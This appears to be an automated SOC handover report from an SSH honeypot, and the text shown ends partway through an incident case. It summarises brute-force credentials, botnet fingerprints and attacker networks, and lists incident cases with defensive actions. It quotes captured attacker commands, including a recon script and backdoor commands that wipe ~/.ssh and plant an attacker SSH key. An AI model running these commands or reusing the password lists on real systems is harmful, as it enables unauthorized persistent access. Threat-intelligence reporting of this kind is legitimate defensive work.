# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-09-01 |
| **Generated At** | 2026-09-01T23:54:04Z |
| **Shift Time** | 23:54 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **262** |
| Confirmed Threats | **237** |
| False Positives Filtered | **25** (9.5%) |
| Unique Attacker IPs | **68** |
| Countries of Origin | **24** |
| High Severity Cases | **184** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **78** |
| Malware Samples Analyzed | **3** HIGH · **20** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **213** |
| Unique Credential Pairs | **165** |
| Unique Usernames | **20** |
| Unique Passwords | **132** |
| Successful Auth Pairs | **194** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 98 |
| `admin` | 45 |
| `345gs5662d34` | 18 |
| `user` | 9 |
| `support` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 18 |
| `support` | 8 |
| `admin` | 8 |
| `admin123` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `support` | `support` | 8 |
| `root` | `3245gs5662d34` | 7 |
| `admin` | `admin` | 5 |
| `pi` | `abcd1234` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin123@` | `217.60.255.130` | 2026-09-01T18:58:14 |
| `admin` | `mypassword` | `217.60.255.130` | 2026-09-01T18:58:29 |
| `support` | `support` | `176.53.159.196` | 2026-09-01T19:03:01 |
| `admin` | `Admin123` | `217.60.255.130` | 2026-09-01T19:08:17 |
| `root` | `a@12345678` | `217.60.255.130` | 2026-09-01T19:09:11 |
| `user` | `1qazXSW@` | `217.60.255.130` | 2026-09-01T19:17:59 |
| `jiang` | `jiang123` | `45.117.177.47` | 2026-09-01T19:18:27 |
| `345gs5662d34` | `345gs5662d34` | `45.117.177.47` | 2026-09-01T19:18:31 |
| `jiang` | `3245gs5662d34` | `45.117.177.47` | 2026-09-01T19:18:33 |
| `root` | `12345Aa@` | `217.60.255.130` | 2026-09-01T19:20:04 |
| `user` | `P@ssw0rd` | `217.60.255.130` | 2026-09-01T19:27:31 |
| `root` | `a123` | `217.60.255.130` | 2026-09-01T19:31:08 |
| `postgres` | `test1234` | `10.0.0.73` | 2026-09-01T19:35:26 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-09-01T19:35:31 |
| `postgres` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T19:35:32 |
| `user` | `user` | `217.60.255.130` | 2026-09-01T19:37:25 |
| `root` | `1qaz$RFV` | `217.60.255.130` | 2026-09-01T19:42:14 |
| `support` | `support` | `10.0.0.73` | 2026-09-01T19:42:25 |
| `root` | `gwh28dgcmp` | `104.248.160.169` | 2026-09-01T19:44:33 |
| `345gs5662d34` | `345gs5662d34` | `104.248.160.169` | 2026-09-01T19:44:35 |
| `root` | `3245gs5662d34` | `104.248.160.169` | 2026-09-01T19:44:35 |
| `admin` | `1a2b3c4d` | `217.60.255.130` | 2026-09-01T19:47:12 |
| `git` | `gitgit` | `37.59.111.144` | 2026-09-01T19:48:03 |
| `345gs5662d34` | `345gs5662d34` | `37.59.111.144` | 2026-09-01T19:48:06 |
| `git` | `3245gs5662d34` | `37.59.111.144` | 2026-09-01T19:48:06 |
| `root` | `ch123456` | `88.249.195.23` | 2026-09-01T19:48:58 |
| `345gs5662d34` | `345gs5662d34` | `88.249.195.23` | 2026-09-01T19:49:01 |
| `root` | `3245gs5662d34` | `88.249.195.23` | 2026-09-01T19:49:02 |
| `alumno` | `alumno` | `41.90.100.147` | 2026-09-01T19:49:08 |
| `345gs5662d34` | `345gs5662d34` | `41.90.100.147` | 2026-09-01T19:49:12 |
| `alumno` | `3245gs5662d34` | `41.90.100.147` | 2026-09-01T19:49:14 |
| `root` | `112233` | `101.96.200.56` | 2026-09-01T19:49:27 |
| `user` | `gfhjkm` | `107.150.105.153` | 2026-09-01T19:49:32 |
| `345gs5662d34` | `345gs5662d34` | `101.96.200.56` | 2026-09-01T19:49:32 |
| `345gs5662d34` | `345gs5662d34` | `107.150.105.153` | 2026-09-01T19:49:34 |
| `root` | `3245gs5662d34` | `101.96.200.56` | 2026-09-01T19:49:34 |
| `user` | `3245gs5662d34` | `107.150.105.153` | 2026-09-01T19:49:34 |
| `root` | `aA!123456` | `151.225.212.1` | 2026-09-01T19:50:40 |
| `345gs5662d34` | `345gs5662d34` | `151.225.212.1` | 2026-09-01T19:50:42 |
| `root` | `3245gs5662d34` | `151.225.212.1` | 2026-09-01T19:50:43 |
| `git` | `hello` | `79.3.96.178` | 2026-09-01T19:52:07 |
| `345gs5662d34` | `345gs5662d34` | `79.3.96.178` | 2026-09-01T19:52:10 |
| `git` | `3245gs5662d34` | `79.3.96.178` | 2026-09-01T19:52:11 |
| `root` | `Indian123` | `217.60.255.130` | 2026-09-01T19:52:59 |
| `root` | `admin123` | `103.63.108.25` | 2026-09-01T19:53:19 |
| `345gs5662d34` | `345gs5662d34` | `103.63.108.25` | 2026-09-01T19:53:24 |
| `root` | `3245gs5662d34` | `103.63.108.25` | 2026-09-01T19:53:25 |
| `root` | `qwer@2024` | `125.138.175.113` | 2026-09-01T19:54:22 |
| `345gs5662d34` | `345gs5662d34` | `125.138.175.113` | 2026-09-01T19:54:26 |
| `root` | `3245gs5662d34` | `125.138.175.113` | 2026-09-01T19:54:27 |
| `root` | `admin` | `193.163.187.76` | 2026-09-01T19:55:26 |
| `server` | `server2025` | `217.60.255.130` | 2026-09-01T19:56:47 |
| `root` | `P@ssw0rd123!@#` | `217.60.255.130` | 2026-09-01T20:04:05 |
| `fastuser` | `fastuser123` | `217.60.255.130` | 2026-09-01T20:06:30 |
| `admin` | `admin` | `39.107.142.38` | 2026-09-01T20:07:06 |
| `admin` | `admin` | `130.12.180.51` | 2026-09-01T20:07:07 |
| `root` | `%PlsASSWORD%` | `217.60.255.130` | 2026-09-01T20:15:11 |
| `admin` | `Qwert123` | `217.60.255.130` | 2026-09-01T20:16:25 |
| `admin` | `Zz123456` | `217.60.255.130` | 2026-09-01T20:25:53 |
| `root` | `online2025` | `217.60.255.130` | 2026-09-01T20:25:55 |
| `root` | `admin` | `192.42.116.57` | 2026-09-01T20:27:48 |
| `admin` | `Bb12345678` | `217.60.255.130` | 2026-09-01T20:35:44 |
| `root` | `Mahdi@123` | `217.60.255.130` | 2026-09-01T20:36:58 |
| `root` | `123@@@` | `64.110.90.250` | 2026-09-01T20:38:47 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-09-01T20:38:47 |
| `root` | `111111` | `195.178.110.217` | 2026-09-01T20:41:50 |
| `root` | `123` | `195.178.110.217` | 2026-09-01T20:43:45 |
| `user` | `1q2w3e` | `217.60.255.130` | 2026-09-01T20:45:31 |
| `root` | `123123` | `195.178.110.217` | 2026-09-01T20:45:39 |
| `root` | `123321` | `195.178.110.217` | 2026-09-01T20:47:32 |
| `root` | `qwer1234!` | `217.60.255.130` | 2026-09-01T20:47:46 |
| `root` | `1234` | `195.178.110.217` | 2026-09-01T20:49:32 |
| `root` | `12345` | `195.178.110.217` | 2026-09-01T20:51:24 |
| `root` | `1234567` | `195.178.110.217` | 2026-09-01T20:54:59 |
| `user` | `Pa$$w0rd` | `217.60.255.130` | 2026-09-01T20:55:04 |
| `root` | `12345678` | `195.178.110.217` | 2026-09-01T20:56:46 |
| `root` | `123456789` | `195.178.110.217` | 2026-09-01T20:58:36 |
| `root` | `It12345` | `217.60.255.130` | 2026-09-01T20:58:43 |
| `root` | `1234abcd` | `195.178.110.217` | 2026-09-01T21:00:34 |
| `root` | `123abc` | `195.178.110.217` | 2026-09-01T21:02:32 |
| `root` | `123qwe` | `195.178.110.217` | 2026-09-01T21:04:22 |
| `user` | `Aa123456` | `217.60.255.130` | 2026-09-01T21:04:47 |
| `root` | `1q2w3e` | `195.178.110.217` | 2026-09-01T21:06:03 |
| `root` | `1q2w3e4r` | `195.178.110.217` | 2026-09-01T21:08:00 |
| `root` | `qq123456` | `77.90.185.20` | 2026-09-01T21:09:12 |
| `root` | `shan` | `217.60.255.130` | 2026-09-01T21:09:48 |
| `root` | `1qaz2wsx` | `195.178.110.217` | 2026-09-01T21:09:50 |
| `root` | `654321` | `195.178.110.217` | 2026-09-01T21:11:37 |
| `root` | `P@ssw0rd` | `195.178.110.217` | 2026-09-01T21:13:24 |
| `test` | `12345` | `217.60.255.130` | 2026-09-01T21:14:35 |
| `root` | `P@ssword` | `195.178.110.217` | 2026-09-01T21:15:11 |
| `root` | `Root123` | `195.178.110.217` | 2026-09-01T21:16:57 |
| `root` | `admin` | `195.178.110.217` | 2026-09-01T21:18:39 |
| `root` | `admin123` | `195.178.110.217` | 2026-09-01T21:20:17 |
| `root` | `Asdfghjkl@123` | `217.60.255.130` | 2026-09-01T21:20:32 |
| `root` | `letmein` | `195.178.110.217` | 2026-09-01T21:21:58 |
| `root` | `passw0rd` | `195.178.110.217` | 2026-09-01T21:23:30 |
| `user` | `Abcd12345` | `217.60.255.130` | 2026-09-01T21:23:58 |
| `root` | `password` | `195.178.110.217` | 2026-09-01T21:25:13 |
| `root` | `password1` | `195.178.110.217` | 2026-09-01T21:26:53 |
| `root` | `qwerty` | `195.178.110.217` | 2026-09-01T21:28:36 |
| `root` | `r00t` | `195.178.110.217` | 2026-09-01T21:30:10 |
| `root` | `Mehdi@2026` | `217.60.255.130` | 2026-09-01T21:31:21 |
| `root` | `root!@#` | `195.178.110.217` | 2026-09-01T21:33:21 |
| `admin` | `admin123` | `217.60.255.130` | 2026-09-01T21:33:35 |
| `root` | `root#123` | `195.178.110.217` | 2026-09-01T21:35:01 |
| `root` | `root0000` | `195.178.110.217` | 2026-09-01T21:36:35 |
| `root` | `root1111` | `195.178.110.217` | 2026-09-01T21:38:10 |
| `root` | `root123` | `195.178.110.217` | 2026-09-01T21:39:43 |
| `root` | `root1234` | `195.178.110.217` | 2026-09-01T21:41:24 |
| `root` | `Hossein@123` | `217.60.255.130` | 2026-09-01T21:42:12 |
| `root` | `root2024` | `195.178.110.217` | 2026-09-01T21:43:05 |
| `admin` | `admin@1234` | `217.60.255.130` | 2026-09-01T21:43:14 |
| `root` | `root2025` | `195.178.110.217` | 2026-09-01T21:44:36 |
| `root` | `root2222` | `195.178.110.217` | 2026-09-01T21:46:11 |
| `root` | `root4444` | `195.178.110.217` | 2026-09-01T21:47:37 |
| `root` | `root5555` | `195.178.110.217` | 2026-09-01T21:49:01 |
| `root` | `root5678` | `195.178.110.217` | 2026-09-01T21:50:36 |
| `root` | `root6666` | `195.178.110.217` | 2026-09-01T21:52:11 |
| `admin` | `Admin12345` | `217.60.255.130` | 2026-09-01T21:52:37 |
| `root` | `Mehdi1234` | `217.60.255.130` | 2026-09-01T21:52:49 |
| `root` | `root9999` | `195.178.110.217` | 2026-09-01T21:53:47 |
| `root` | `root@123` | `195.178.110.217` | 2026-09-01T21:55:26 |
| `root` | `rootaccess` | `195.178.110.217` | 2026-09-01T21:56:54 |
| `root` | `rootadmin` | `195.178.110.217` | 2026-09-01T21:58:21 |
| `root` | `rootme` | `195.178.110.217` | 2026-09-01T21:59:50 |
| `root` | `rootpass` | `195.178.110.217` | 2026-09-01T22:01:18 |
| `admin` | `admin@123` | `217.60.255.130` | 2026-09-01T22:02:09 |
| `root` | `rootpw` | `195.178.110.217` | 2026-09-01T22:02:49 |
| `root` | `Mahdi1234` | `217.60.255.130` | 2026-09-01T22:03:35 |
| `root` | `rootroot` | `195.178.110.217` | 2026-09-01T22:04:22 |
| `pi` | `abcd1234` | `10.0.0.73` | 2026-09-01T22:05:09 |
| `root` | `toor` | `195.178.110.217` | 2026-09-01T22:05:47 |
| `root` | `welcome` | `195.178.110.217` | 2026-09-01T22:07:20 |
| `admin` | `1234` | `195.178.110.217` | 2026-09-01T22:08:54 |
| `admin` | `12345` | `195.178.110.217` | 2026-09-01T22:10:25 |
| `admin` | `Password` | `217.60.255.130` | 2026-09-01T22:11:46 |
| `admin` | `123456` | `195.178.110.217` | 2026-09-01T22:11:54 |
| `admin` | `123456789` | `195.178.110.217` | 2026-09-01T22:13:22 |
| `root` | `Mostafa@1234` | `217.60.255.130` | 2026-09-01T22:14:07 |
| `admin` | `123qwe` | `195.178.110.217` | 2026-09-01T22:14:46 |
| `admin` | `123qwerty` | `195.178.110.217` | 2026-09-01T22:16:08 |
| `admin` | `21` | `195.178.110.217` | 2026-09-01T22:17:28 |
| `admin` | `321` | `195.178.110.217` | 2026-09-01T22:18:49 |
| `admin` | `654321` | `195.178.110.217` | 2026-09-01T22:20:07 |
| `admin` | `0` | `217.60.255.130` | 2026-09-01T22:21:07 |
| `admin` | `Admin@123` | `195.178.110.217` | 2026-09-01T22:21:27 |
| `admin` | `admin` | `10.0.0.73` | 2026-09-01T22:22:22 |
| `admin` | `P@ssw0rd` | `195.178.110.217` | 2026-09-01T22:22:51 |
| `admin` | `Password` | `195.178.110.217` | 2026-09-01T22:24:18 |
| `root` | `Mohamad@1234` | `217.60.255.130` | 2026-09-01T22:25:00 |
| `admin` | `admin` | `195.178.110.217` | 2026-09-01T22:25:49 |
| `admin` | `admin#123` | `195.178.110.217` | 2026-09-01T22:27:14 |
| `admin` | `admin1` | `195.178.110.217` | 2026-09-01T22:28:39 |
| `root` | `p@ssw0rd123` | `45.154.244.193` | 2026-09-01T22:29:25 |
| `elk` | `12345678` | `10.0.0.73` | 2026-09-01T22:29:42 |
| `elk` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T22:29:47 |
| `admin` | `admin12` | `195.178.110.217` | 2026-09-01T22:30:00 |
| `ftpuser` | `test` | `10.0.0.73` | 2026-09-01T22:30:03 |
| `ftpuser` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T22:30:07 |
| `root` | `909090` | `10.0.0.73` | 2026-09-01T22:30:24 |
| `administrator` | `administrator@123` | `217.60.255.130` | 2026-09-01T22:30:44 |
| `david` | `admin123` | `10.0.0.73` | 2026-09-01T22:30:45 |
| `david` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T22:30:51 |
| `admin` | `admin123` | `195.178.110.217` | 2026-09-01T22:31:26 |
| `admin` | `admin2024` | `195.178.110.217` | 2026-09-01T22:32:46 |
| `root` | `123@qweASD` | `10.0.0.73` | 2026-09-01T22:33:32 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-09-01T22:33:34 |
| `admin` | `admin@123` | `195.178.110.217` | 2026-09-01T22:34:05 |
| `admin` | `adminadmin` | `195.178.110.217` | 2026-09-01T22:35:22 |
| `root` | `Amir1234` | `217.60.255.130` | 2026-09-01T22:35:54 |
| `asad` | `123` | `116.228.233.93` | 2026-09-01T22:36:25 |
| `345gs5662d34` | `345gs5662d34` | `116.228.233.93` | 2026-09-01T22:36:28 |
| `asad` | `3245gs5662d34` | `116.228.233.93` | 2026-09-01T22:36:30 |
| `admin` | `default` | `195.178.110.217` | 2026-09-01T22:36:42 |
| `admin` | `letmein` | `195.178.110.217` | 2026-09-01T22:38:05 |
| `admin` | `pa$w0rd` | `195.178.110.217` | 2026-09-01T22:39:34 |
| `dbadmin` | `admin@123` | `217.60.255.130` | 2026-09-01T22:40:21 |
| `admin` | `pass@123` | `195.178.110.217` | 2026-09-01T22:41:02 |
| `admin` | `passw0rd` | `195.178.110.217` | 2026-09-01T22:42:31 |
| `asad` | `123` | `59.15.58.148` | 2026-09-01T22:43:46 |
| `345gs5662d34` | `345gs5662d34` | `59.15.58.148` | 2026-09-01T22:43:49 |
| `asad` | `3245gs5662d34` | `59.15.58.148` | 2026-09-01T22:43:51 |
| `admin` | `password` | `195.178.110.217` | 2026-09-01T22:43:58 |
| `admin` | `qwerty` | `195.178.110.217` | 2026-09-01T22:45:24 |
| `root` | `1234qwer!@#$` | `217.60.255.130` | 2026-09-01T22:46:24 |
| `admin` | `welcome1` | `195.178.110.217` | 2026-09-01T22:46:52 |
| `ansible` | `12345` | `195.178.110.217` | 2026-09-01T22:48:16 |
| `ansible` | `123456` | `195.178.110.217` | 2026-09-01T22:49:38 |
| `admin` | `Pass@1234` | `217.60.255.130` | 2026-09-01T22:49:45 |
| `ansible` | `123456789` | `195.178.110.217` | 2026-09-01T22:50:59 |
| `ansible` | `ansible` | `195.178.110.217` | 2026-09-01T22:52:16 |
| `ansible` | `ansible123` | `195.178.110.217` | 2026-09-01T22:53:34 |
| `ansible` | `password` | `195.178.110.217` | 2026-09-01T22:54:53 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **262** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 108 |
| Go SSH scanner | 99 |
| Unknown | 2 |
| Paramiko (Python) | 2 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 86 | 1 |
| `419da4c91ddb...` | Modern SSH client | 47 | 1 |
| `f555226df196...` | Mirai/variant | 37 | 13 |
| `eff4c24daffc...` | Modern SSH client | 5 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 86 | 1 | Mirai/variant |
| `419da4c91ddb...` | libssh | 47 | 1 | Modern SSH client |
| `f555226df196...` | libssh | 37 | 13 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 6 | — |
| `eff4c24daffc...` | Go SSH scanner | 5 | 1 | Modern SSH client |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `16443846184e...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `4e066189c3bb...` | Go SSH scanner | 3 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 84 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 13 | 13 | `T1021.004, T1078, T1070, T1140` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.217`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.117.177.47`, `116.228.233.93`, `37.59.111.144`, `103.63.108.25`, `101.96.200.56`, `107.150.105.153`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1h
```
Source IPs: `77.90.185.20`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **68** |
| Unique ASNs | **41** |
| High-Risk ASNs | **33** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 12 | HIGH |
| `AS396982` | Google LLC | 7 | LOW |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (184)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a663d055a253

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:58 |
| **Last Seen** | 2026-09-01 18:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:58:12` | `cowrie.session.connect` |
| `2026-09-01 18:58:12` | `cowrie.client.version` |
| `2026-09-01 18:58:12` | `cowrie.client.kex` |
| `2026-09-01 18:58:14` | `cowrie.login.success` |
| `2026-09-01 18:58:14` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:58:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:58:14` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3635dde1dbf3

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 18:58 |
| **Last Seen** | 2026-09-01 18:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 18:58:28` | `cowrie.session.connect` |
| `2026-09-01 18:58:28` | `cowrie.client.version` |
| `2026-09-01 18:58:28` | `cowrie.client.kex` |
| `2026-09-01 18:58:29` | `cowrie.login.success` |
| `2026-09-01 18:58:30` | `cowrie.direct-tcpip.request` |
| `2026-09-01 18:58:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 18:58:30` | `cowrie.direct-tcpip.data` |
| `2026-09-01 18:58:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49dd12cfb847

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-01 19:03 |
| **Last Seen** | 2026-09-01 19:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:03:01` | `cowrie.session.connect` |
| `2026-09-01 19:03:01` | `cowrie.client.version` |
| `2026-09-01 19:03:01` | `cowrie.client.kex` |
| `2026-09-01 19:03:01` | `cowrie.login.success` |
| `2026-09-01 19:03:01` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:03:01` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6662b897e6b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:08 |
| **Last Seen** | 2026-09-01 19:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:08:16` | `cowrie.session.connect` |
| `2026-09-01 19:08:16` | `cowrie.client.version` |
| `2026-09-01 19:08:16` | `cowrie.client.kex` |
| `2026-09-01 19:08:17` | `cowrie.login.success` |
| `2026-09-01 19:08:17` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:08:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:08:18` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3059c72c222a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:09 |
| **Last Seen** | 2026-09-01 19:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-01 19:09:10` | `cowrie.session.connect` |
| `2026-09-01 19:09:10` | `cowrie.client.version` |
| `2026-09-01 19:09:10` | `cowrie.client.kex` |
| `2026-09-01 19:09:11` | `cowrie.login.success` |
| `2026-09-01 19:09:11` | `cowrie.direct-tcpip.request` |
| `2026-09-01 19:09:11` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-01 19:09:11` | `cowrie.direct-tcpip.data` |
| `2026-09-01 19:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-339ad5e1a6ec

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-01 19:17 |
| **Last Seen** | 2026-09-01 19:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
